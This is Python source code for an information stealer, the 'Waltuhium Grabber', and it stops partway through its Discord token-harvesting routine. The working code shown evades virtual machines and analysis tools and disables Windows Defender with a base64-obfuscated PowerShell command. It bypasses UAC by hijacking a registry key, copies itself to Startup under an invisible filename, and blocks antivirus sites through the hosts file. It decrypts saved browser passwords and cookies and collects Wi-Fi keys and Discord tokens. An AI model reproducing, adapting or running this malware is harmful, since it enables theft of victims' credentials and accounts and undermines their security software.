# Python 3.10+
# Author: waltuhium
# Github: https://github.com/waltuhium/Waltuhium-Grabber
# Encoding: UTF-8

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib

from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:

    C2 = "%c2%"
    Mutex = "%mutex%"
    PingMe = bool("%pingme%")
    Vmprotect = bool("%vmprotect%")
    Startup = bool("%startup%")
    Melt = bool("%melt%")
    UacBypass = bool("%uacBypass%")
    ArchivePassword = "%archivepassword%"
    HideConsole = bool("%hideconsole%")
    Debug = bool("%debug%")
    RunBoundOnStartup = bool("%boundfilerunonstartup%")

    CaptureWebcam = bool("%capturewebcam%")
    CapturePasswords = bool("%capturepasswords%")
    CaptureCookies = bool("%capturecookies%")
    CaptureAutofills = bool("%captureautofills%")
    CaptureHistory = bool("%capturehistory%")
    CaptureDiscordTokens = bool("%capturediscordtokens%")
    CaptureGames = bool("%capturegames%")
    CaptureWifiPasswords = bool("%capturewifipasswords%")
    CaptureSystemInfo = bool("%capturesysteminfo%")
    CaptureScreenshot = bool("%capturescreenshot%")
    CaptureTelegram = bool("%capturetelegram%")
    CaptureCommonFiles = bool("%capturecommonfiles%")
    CaptureWallets = bool("%capturewallets%")

    FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
    BlockAvSites = bool("%blockavsites%")
    DiscordInjection = bool("%discordinjection%")

if not hasattr(sys, "_MEIPASS"):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Defines _MEIPASS if does not exist (py mode)

ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) # Enables VT100 escape sequences
logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled= True
Logger = logging.getLogger("Waltuhium Grabber")
Logger.setLevel(logging.INFO)

if not Settings.Debug:
    Logger.disabled = True


class VmProtect:

    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
        Logger.info("Checking UUID")
        uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
        Logger.info("Checking computer name")
        computername = os.getenv("computername")
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
        Logger.info("Checking username")
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
        Logger.info("Checking if system is hosted online")
        http = PoolManager(cert_reqs="CERT_NONE")
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors= "ignore").strip() == 'true'
        except Exception:
            Logger.info("Unable to check if system is hosted online")
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
        Logger.info("Checking if system is simulating connection")
        http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
        try:
            http.request('GET', f'https://waltuhium-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
        Logger.info("Checking registry")
        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= "ignore").splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None: # Kills blacklisted processes
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool: # Checks if the user is running on a VM or not
        Logger.info("Checking if system is a VM")
        Thread(target= VmProtect.killTasks, daemon= True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info("System is a VM")
        else:
            Logger.info("System is not a VM")
        return result

class Errors:

    errors: list[str] = []

    @staticmethod 
    def Catch(func): # Decorator to catch exceptions and store them in the `errors` list
        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt): # If user presses CTRL+C, then exit
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]: # If exe mode, then print the traceback
                        Logger.error(trb)
        
        return newFunc

class Tasks:

    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None: # Add new thread to the list
        Tasks.threads.append(task)
    
    @staticmethod
    def WaitForAll() -> None: # Wait for all threads to finish
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 0x40000000
        WM_CAP_DRIVER_CONNECT = 0x0400 + 10
        WM_CAP_DRIVER_DISCONNECT = 0x0402
        WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25

        hcam = avicap32.capCreateCaptureWindowW(
            wintypes.LPWSTR("Waltuhium"),
            WS_CHILD,
            0, 0, 0, 0,
            ctypes.windll.user32.GetDesktopWindow(), 0
        )

        result = False

        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:

        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)

        return kernel32.GetLastError() != 183
    
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")
    
    @staticmethod
    def HideConsole() -> None: # Hides the console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)
        
    @staticmethod
    def TaskKill(*tasks: str) -> None: # Tries to kill given processes
        tasks = list(map(lambda x: x.lower(), tasks))
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name [:-4] if name.endswith(".exe") else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
            except Exception:
                pass
    
    @staticmethod
    def UACPrompt(path: str) -> bool: # Shows UAC Prompt
        return ctypes.windll.shell32.ShellExecuteW(None, "runas", path, " ".join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender() -> None: # Tries to disable the defender
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
        subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    @staticmethod
    def ExcludeFromDefender(path: str = None) -> None: # Tries to exclude a file or folder from defender's scan
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
    
    @staticmethod
    def GetWifiPasswords() -> dict: # Gets wifi passwords stored in the system
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'All User Profile' in line:
                name= line[(line.find(':') + 1):].strip()
                profiles.append(name)
        
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None: # Finds the target of the given shortcut file
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith("Target="):
                        temp = line.lstrip("Target=").strip()
                        if os.path.exists(temp):
                            target = temp
                            break

        return target
    
    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]: # Finds the shortcut to an app in the start menu
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        
        return shortcutPaths
    
    @staticmethod
    def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    
    @staticmethod
    def UACbypass(method: int = 1) -> bool: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
        if Utility.GetSelf()[1]:
        
            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        
            match method:
                case 1:
                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("computerdefaults --nouacbypass")
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)

                case 2:

                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("fodhelper --nouacbypass")
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            
            return True
    
    @staticmethod
    def IsInStartup() -> bool: # Checks if the file is in startup
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == "startup"
    
    @staticmethod
    def PutInStartup() -> str: # Puts the file in startup (exe mode)
        STARTUPDIR = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, "{}.scr".format(Utility.GetRandomString(invisible= True)))
            os.makedirs(STARTUPDIR, exist_ok= True)
            try: shutil.copy(file, out) 
            except Exception: return None
            return out
    
    @staticmethod
    def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
        http = PoolManager(cert_reqs="CERT_NONE")
        try:
            return http.request("GET", "https://gstatic.com/generate_204").status == 204
        except Exception:
            return False
    
    @staticmethod
    def DeleteSelf(): # Deletes the current file
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)
    
    @staticmethod
    def HideSelf() -> None: # Hides the current file
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None: # Tries to block AV related sites using hosts file
        if Utility.IsAdmin():
            call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell= True, capture_output= True)
            if call.returncode != 0:
                hostdirpath = os.path.join("System32", "drivers", "etc")
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors= "ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath , "hosts")
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()

            BANNED_SITES = ("virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com")
            newdata = []
            for i in data:
                if any([(x in i) for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)

            for i in BANNED_SITES:
                newdata.append("\t0.0.0.0 {}".format(i))
                newdata.append("\t0.0.0.0 www.{}".format(i))

            newdata = "\n".join(newdata).replace("\n\n", "\n")

            subprocess.run("attrib -r {}".format(hostfilepath), shell= True, capture_output= True) # Removes read-only attribute from hosts file
            with open(hostfilepath, "w") as file:
                file.write(newdata)
            subprocess.run("attrib +r {}".format(hostfilepath), shell= True, capture_output= True) # Adds read-only attribute to hosts file
    
class Browsers:

    class Chromium:

        BrowserPath: str = None # Stores the path to the browser's storage directory
        EncryptionKey: bytes = None # Stores the encryption key that the browser uses to encrypt the data

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath): # Checks if the browser's storage directory exists
                raise NotADirectoryError("Browser path not found!")

            self.BrowserPath = browserPath
        
        def GetEncryptionKey(self) -> bytes | None: # Gets the encryption key
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            
            else:
                localStatePath = os.path.join(self.BrowserPath, "Local State")
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                        jsonContent: dict = json.load(file)

                    encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey

                else:
                    return None
        
        def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key

            version = buffer.decode(errors= "ignore")
            if (version.startswith(("v10", "v11"))):
                iv = buffer[3:15]
                cipherText = buffer[15:]

                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
            else:
                return str(Syscalls.CryptUnprotectData(buffer))
        
        def GetPasswords(self) -> list[tuple[str, str, str]]: # Gets all passwords from the browser
            encryptionKey = self.GetEncryptionKey()
            passwords = list()

            if encryptionKey is None:
                return passwords

            loginFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "login data":
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)

                        if url and username and password:
                            passwords.append((url, username, password))

                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)
            
            return passwords
        
        def GetCookies(self) -> list[tuple[str, str, str, str, int]]: # Gets all cookies from the browser
            encryptionKey = self.GetEncryptionKey()
            cookies = list()

            if encryptionKey is None:
                return cookies
            
            cookiesFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "cookies":
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)

                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))

                except Exception:
                        pass

                cursor.close()
                db.close()
                os.remove(tempfile)
            
            return cookies
        
        def GetHistory(self) -> list[tuple[str, str, int]]: # Gets all browsing history of the browser
            history = list()
            historyFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()

                    for url, title, vc, lvt in results:
                        if url and title and vc is not None and lvt is not None:
                                history.append((url, title, vc, lvt))
                except Exception:
                    pass
                    
                cursor.close()
                db.close()
                os.remove(tempfile)
            
            history.sort(key= lambda x: x[3], reverse= True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]

                    for data in results:
                        data = data.strip()
                        if data and not data in autofills:
                            autofills.append(data)
                except Exception:
                    pass
                    
                cursor.close()
                db.close()
                os.remove(tempfile)
            
            return autofills

class Discord:

    httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
    ROAMING = os.getenv("appdata") # Roaming directory
    LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # Regular expression for matching tokens
    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*" # Regular expression for matching encrypted tokens in Discord clients

    @staticmethod
    def GetHeaders(token: str = None) -> dict: # Returns headers for making requests
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }

        if token:
            headers["authorization"] = token

        return headers
    
    @staticmethod
    def GetTokens() -> list[dict]: # Gets tokens from Discord clients and browsers
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()

        paths = {
            "Discord": os.path.join(Discord.ROAMING, "discord"),
            "Discord Canary": os.path.join(Discord.ROAMING, "discordcanary"),
            "Lightcord": os.path.join(Discord.ROAMING, "Lightcord"),
            "Discord PTB": os.path.join(Discord.ROAMING, "discordptb"),
            "Opera": os.path.join(Discord.ROAMING, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(Discord.ROAMING, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(Discord.LOCALAPPDATA, "Amigo", "User Data"),
            "Torch": os.path.join(Discord.LOCALAPPDATA, "Torch", "User Data"),
            "Kometa": os.path.join(Discord.LOCALAPPDATA, "Kometa", "User Data"),
            "Orbitum": os.path.join(Discord.LOCALAPPDATA, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(Discord.LOCALAPPDATA, "CentBrowser", "User Data"),
            "7Sta": os.path.join(Discord.LOCALAPPDATA, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(Discord.LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(Discord.LOCALAPPDATA, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome", "User Data"),
            "FireFox" : os.path.join(Discord.ROAMING, "Mozilla", "Firefox", "Profiles"),
            "Epic Privacy Browse": os.path.join(Discord.LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(Discord.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(Discord.LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(Discord.LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(Discord.LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(Discord.LOCALAPPDATA, "Iridium", "User Data"),
        }

        for name, path in paths.items():
            if os.path.isdir(path):
                if name == "FireFox":
                    t = Thread(target= lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target= lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)

                    t = Thread(target= lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        
        for thread in threads:
            thread.join()
        
        tokens = [*set(tokens)]
        
        for token in tokens:
